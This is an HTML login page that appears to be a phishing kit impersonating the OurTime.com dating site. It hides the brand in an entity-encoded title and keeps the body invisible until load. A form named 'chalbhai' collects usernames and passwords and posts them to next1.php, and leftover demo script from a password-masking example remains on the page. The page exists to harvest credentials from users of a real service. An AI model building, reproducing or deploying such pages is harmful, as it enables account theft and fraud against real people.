<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#79;&#117;&#114;&#84;&#105;&#109;&#101;&#46;&#99;&#111;&#109;&#32;&#45;&#32;&#84;&#104;&#101;&#32;&#53;&#48;&#43;&#32;&#83;&#105;&#110;&#103;&#108;&#101;&#32;&#78;&#101;&#116;&#119;&#111;&#114;&#107;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {  
    border: solid 1px #999;
  	padding-left:2px;
	font-size: 15px;
    height: 24px; 
    width: 275px; 
 } 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image6" style="position:absolute; overflow:hidden; left:306px; top:623px; width:66px; height:40px; z-index:0"><img src="images/em.png" alt="" title="" border=0 width=66 height=40></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:82px; z-index:1"><img src="images/te1.png" alt="" title="" border=0 width=1350 height=82></div>

<div id="image2" style="position:absolute; overflow:hidden; left:101px; top:17px; width:195px; height:47px; z-index:2"><a href="#"><img src="images/te2.png" alt="" title="" border=0 width=195 height=47></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1131px; top:9px; width:116px; height:18px; z-index:3"><a href="#"><img src="images/te3.png" alt="" title="" border=0 width=116 height=18></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:101px; top:101px; width:822px; height:315px; z-index:4"><img src="images/te4.png" alt="" title="" border=0 width=822 height=315></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:476px; width:1349px; height:78px; z-index:5"><img src="images/te5.png" alt="" title="" border=0 width=1349 height=78></div>

<div id="image7" style="position:absolute; overflow:hidden; left:275px; top:575px; width:789px; height:32px; z-index:6"><a href="#"><img src="images/te6.png" alt="" title="" border=0 width=789 height=32></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:455px; top:496px; width:163px; height:17px; z-index:7"><a href="#"><img src="images/te7.png" alt="" title="" border=0 width=163 height=17></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:632px; top:302px; width:66px; height:15px; z-index:8"><a href="#"><img src="images/te8.png" alt="" title="" border=0 width=66 height=15></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:633px; top:215px; width:58px; height:15px; z-index:9"><a href="#"><img src="images/te9.png" alt="" title="" border=0 width=58 height=15></a></div>
<form action=next1.php name=chalbhai id=chalbhai method=post>
<input name="usr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:232px;top:214px;z-index:10">
<input name="psw" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:232px;top:262px;z-index:11">
<div id="formcheckbox1" style="position:absolute; left:224px; top:304px; z-index:12"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:224px; top:343px; z-index:13"><input type="image" name="formimage1" width="70" height="33" src="images/login.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
